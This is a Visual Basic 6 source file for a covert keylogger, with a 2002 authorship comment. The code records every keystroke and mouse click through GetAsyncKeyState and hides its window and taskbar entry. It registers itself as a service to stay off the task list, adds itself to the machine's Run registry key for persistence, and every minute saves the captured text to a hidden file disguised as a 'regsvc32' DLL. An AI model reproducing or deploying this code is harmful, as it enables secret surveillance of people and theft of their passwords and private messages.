VERSION 5.00
Begin VB.Form FRMLOG 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "<LOGGER>"
   ClientHeight    =   3195
   ClientLeft      =   3255
   ClientTop       =   1785
   ClientWidth     =   4680
   Icon            =   "FRMLOG.frx":0000
   LinkTopic       =   "KEYLOG"
   MaxButton       =   0   'False
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   Begin VB.Timer tmrSAVE 
      Interval        =   60000
      Left            =   0
      Top             =   0
   End
   Begin VB.Timer tmrLOG 
      Interval        =   10
      Left            =   0
      Top             =   0
   End
   Begin VB.Timer tmrCAPTION 
      Interval        =   10000
      Left            =   0
      Top             =   0
   End
   Begin VB.Frame FRALOG 
      Caption         =   "Logged Text:"
      Height          =   15
      Left            =   480
      TabIndex        =   0
      Top             =   840
      Width           =   15
      Begin VB.TextBox txtENUMERATE 
         Height          =   195
         Left            =   360
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   2
         Top             =   240
         Width           =   150
      End
      Begin VB.TextBox txtLOGGED 
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   1
         ToolTipText     =   "Double Click To Clear Window"
         Top             =   240
         Width           =   165
      End
   End
End
Attribute VB_Name = "FRMLOG"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'ALL CODE IS ©2002 Jaime Muscatelli
'WEBMASTER@JAIMEMUSCATELLI.ZZN.COM
'Study this code, but just don't change the name
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal ProcessID As Long, ByVal ServiceFlags As Long) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long

Private sAppName As String

'Reg Stuff
Private Const REG_SZ = 1
Private Const LOCALMACHINE = &H80000002
Private Const RSP_SIMPLE_SERVICE = 1
Private Const RSP_UNREGISTER_SERVICE = 0
'Key Codes
Private Const VK_BACK = &H8
Private Const VK_CONTROL = &H11
Private Const VK_SHIFT = &H10
Private Const VK_TAB = &H9
Private Const VK_RETURN = &HD
Private Const VK_MENU = &H12
Private Const VK_ESCAPE = &H1B
Private Const VK_CAPITAL = &H14
Private Const VK_SPACE = &H20
Private Const VK_SNAPSHOT = &H2C
Private Const VK_UP = &H26
Private Const VK_DOWN = &H28
Private Const VK_LEFT = &H25
Private Const VK_RIGHT = &H27
Private Const VK_MBUTTON = &H4
Private Const VK_RBUTTON = &H2
Private Const VK_LBUTTON = &H1
Private Const VK_PERIOD = &HBE
Private Const VK_COMMA = &HBC
'Num lock Numbers
Private Const VK_NUMLOCK = &H90
Private Const VK_NUMPAD0 = &H60
Private Const VK_NUMPAD1 = &H61
Private Const VK_NUMPAD2 = &H62
Private Const VK_NUMPAD3 = &H63
Private Const VK_NUMPAD4 = &H64
Private Const VK_NUMPAD5 = &H65
Private Const VK_NUMPAD6 = &H66
Private Const VK_NUMPAD7 = &H67
Private Const VK_NUMPAD8 = &H68
Private Const VK_NUMPAD9 = &H69
'F Keys
Private Const VK_F9 = &H78
Private Const VK_F8 = &H77
Private Const VK_F7 = &H76
Private Const VK_F6 = &H75
Private Const VK_F5 = &H74
Private Const VK_F4 = &H73
Private Const VK_F3 = &H72
Private Const VK_F2 = &H71
Private Const VK_F12 = &H7B
Private Const VK_F11 = &H7A
Private Const VK_F10 = &H79
Private Const VK_F1 = &H70
Private Sub LoadTextFile()
On Error GoTo dlgerror
If Len(App.Path) <= 3 Then
Open App.Path & "settings.ini" For Input As #1
Line Input #1, sAppName
Close
Else
Open App.Path & "\settings.ini" For Input As #1
Line Input #1, sAppName
Close
End If

If sAppName = vbNullString Then
sAppName = "regsvc32"
End If

Exit Sub
dlgerror:
sAppName = "regsvc32"

End Sub


Private Sub SAVEDLL()
Dim nSaveLocation As String
On Error GoTo dlgerror

If Len(App.Path) <= 3 Then
Open App.Path & sAppName & ".dll" For Append As #1
nSaveLocation = App.Path & sAppName & ".dll"
GoTo READY
Else
Open App.Path & "\" & sAppName & ".dll" For Append As #1
nSaveLocation = App.Path & "\" & sAppName & ".dll"
GoTo READY
End If

READY:
    
    If txtLOGGED.Text = vbNullString Then
    Exit Sub
    End If
    
    Print #1, Time & " " & Date & vbCrLf & "Size: " & Format(FileLen(nSaveLocation) / 1000000, ".0") & " MB" & vbCrLf & "*** PROGRAMS OPENED ***" & vbCrLf & vbCrLf & txtENUMERATE.Text & vbCrLf & vbCrLf & txtLOGGED.Text & vbCrLf & vbCrLf
    Close
    Close
    Close
    SetAttr nSaveLocation, vbHidden
   Exit Sub
dlgerror:
Err.Clear
Exit Sub
End Sub
Private Sub Form_Load()
On Error Resume Next
Call LoadTextFile
Me.Caption = sAppName
Me.Visible = False
App.TaskVisible = False
App.Title = sAppName
ENTERREGISTRY
RegisterServiceProcess GetCurrentProcessId(), RSP_SIMPLE_SERVICE
End Sub
Private Sub ENTERREGISTRY()
Dim nKey As Long
RegCreateKey LOCALMACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", nKey
If Len(App.Path) <= 3 Then
RegSetValueEx nKey, App.EXEName, 0, REG_SZ, App.Path & App.EXEName & ".exe", Len(App.Path & App.EXEName & ".exe")
Else
RegSetValueEx nKey, App.EXEName, 0, REG_SZ, App.Path & "\" & App.EXEName & ".exe", Len(App.Path & "\" & App.EXEName & ".exe")
End If
End Sub
Private Sub Form_Unload(Cancel As Integer)
Cancel = True
Call SAVEDLL
ENTERREGISTRY
Unload Me
End
End Sub
Private Sub tmrCAPTION_Timer()
On Error Resume Next
Me.Caption = sAppName
Me.Visible = False
App.TaskVisible = False
App.Title = False
RegisterServiceProcess GetCurrentProcessId(), RSP_SIMPLE_SERVICE
End Sub

Private Sub tmrLOG_Timer()
On Error Resume Next
Dim nKey, nChar As Integer
Dim nText As String
For nChar = 1 To 255
nKey = GetAsyncKeyState(nChar)
If nKey = -32767 Then
nText = Chr(nChar)
' The next IFs will check if the character code == a specific Hex code for a key
    If nChar = VK_BACK Then
    nText = " {B.S} "
    ElseIf nChar = VK_CONTROL Then
    nText = " {CTRL} "
     ElseIf nChar = VK_SHIFT Then
   nText = " {SHIFT} "
   ElseIf nChar = VK_TAB Then
   nText = " {TAB} "
   ElseIf nChar = VK_RETURN Then
   nText = " {ENTER} "
   ElseIf nChar = VK_MENU Then
   nText = " {ALT} "
   ElseIf nChar = VK_ESCAPE Then
   nText = " {ESC} "
   ElseIf nChar = VK_CAPITAL Then
   nText = " {CAPS} "
   ElseIf nChar = VK_SPACE Then
   nText = " {SP.B} "
   ElseIf nChar = VK_UP Then
   nText = " {UP} "
   ElseIf nChar = VK_LEFT Then
   nText = " {LEFT} "
   ElseIf nChar = VK_RIGHT Then
   nText = " {RIGHT} "
   ElseIf nChar = VK_DOWN Then
   nText = " {DOWN} "
   ElseIf nChar = VK_F1 Then
   nText = " {F1} "
   ElseIf nChar = VK_F2 Then
   nText = " {F2} "
   ElseIf nChar = VK_F3 Then
   nText = " {F3} "
   ElseIf nChar = VK_F4 Then
   nText = " {F4} "
   ElseIf nChar = VK_F5 Then
   nText = " {F5} "
   ElseIf nChar = VK_F6 Then
   nText = " {F6} "
   ElseIf nChar = VK_F7 Then
   nText = " {F7} "
   ElseIf nChar = VK_F8 Then
   nText = " {F8} "
   ElseIf nChar = VK_F9 Then
   nText = "{F9}"
   ElseIf nChar = VK_F10 Then
   nText = " {F10} "
   ElseIf nChar = VK_F11 Then
   nText = " {F11} "
   ElseIf nChar = VK_F12 Then
   nText = " {F12} "
   ElseIf nChar = VK_SNAPSHOT Then
   nText = " {PRINT SCRN} "
   ElseIf nChar = VK_RBUTTON Then
   nText = " {R.B} "
   ElseIf nChar = VK_LBUTTON Then
   nText = " {L.B} "
   ElseIf nChar = VK_MBUTTON Then
   nText = " {M.B} "
   ElseIf nChar = VK_PERIOD Then
   nText = "."
   ElseIf nChar = VK_COMMA Then
   nText = ","
   ElseIf nChar = VK_NUMLOCK Then
   nText = " {NUMLCK} "
   ElseIf nChar = VK_NUMPAD0 Then
   nText = "0"
   ElseIf nChar = VK_NUMPAD1 Then
   nText = "1"
   ElseIf nChar = VK_NUMPAD2 Then
   nText = "2"
   ElseIf nChar = VK_NUMPAD3 Then
   nText = "3"
   ElseIf nChar = VK_NUMPAD4 Then
   nText = "4"
   ElseIf nChar = VK_NUMPAD5 Then
   nText = "5"
   ElseIf nChar = VK_NUMPAD6 Then
   nText = "6"
   ElseIf nChar = VK_NUMPAD7 Then
   nText = "7"
   ElseIf nChar = VK_NUMPAD8 Then
   nText = "8"
   ElseIf nChar = VK_NUMPAD9 Then
   nText = "9"
   End If
txtLOGGED.Text = txtLOGGED.Text + nText
End If
Next
Call GetActiveWindowName
End Sub
Private Sub tmrSAVE_Timer()
Call SAVEDLL
txtLOGGED.Text = vbNullString
txtENUMERATE.Text = vbNullString
End Sub
